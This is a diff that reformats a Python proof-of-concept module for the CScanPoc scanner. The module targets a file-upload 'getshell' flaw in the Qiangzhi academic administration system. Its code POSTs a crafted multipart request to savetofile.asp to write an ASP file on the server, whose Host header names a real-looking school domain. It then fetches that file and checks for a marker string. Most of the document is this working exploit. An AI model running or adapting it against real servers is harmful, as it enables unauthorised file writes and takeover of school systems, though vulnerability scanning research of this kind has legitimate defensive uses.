@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Qiangzhi_0001' # 平台漏洞编号，留空
-    name = '强智教务系统通杀Getshell' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    vuln_id = 'Qiangzhi_0001'  # 平台漏洞编号，留空
+    name = '强智教务系统通杀Getshell'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-27'  # 漏洞公布时间
     desc = '''
         强智教务系统通杀Getshell.
         /jiaowu/jwgl/jcxx/savetofile.asp
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=074367
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=074367
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = '强智教务系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '36802f4c-024c-48f1-8824-ef8c1ec93883'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            raw1='''
+            raw1 = '''
 POST /jiaowu/jwgl/jcxx/savetofile.asp HTTP/1.1
 Host: jwc.whhhxy.com
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
@@ -56,13 +57,14 @@ Content-Disposition: form-data; name="Button2"
 ÉÏ´«
 -----------------------------496647414724--
                 '''
-            url=arg+"/jwgl/jcxx/savetofile.asp"
-            url2=arg+"/jwgl/jcxx/1.asp"
+            url = arg+"/jwgl/jcxx/savetofile.asp"
+            url2 = arg+"/jwgl/jcxx/1.asp"
 
-            code,head,res,errcode,_=hh.http(url,raw=raw1)
-            code1,head1,res1,errcode,_=hh.http(url2)
-            if code==200 and 'c42ca4238a0b923820dcc509a6f75849b' in res1:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+            code, head, res, errcode, _ = hh.http(url, raw=raw1)
+            code1, head1, res1, errcode, _ = hh.http(url2)
+            if code == 200 and 'c42ca4238a0b923820dcc509a6f75849b' in res1:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
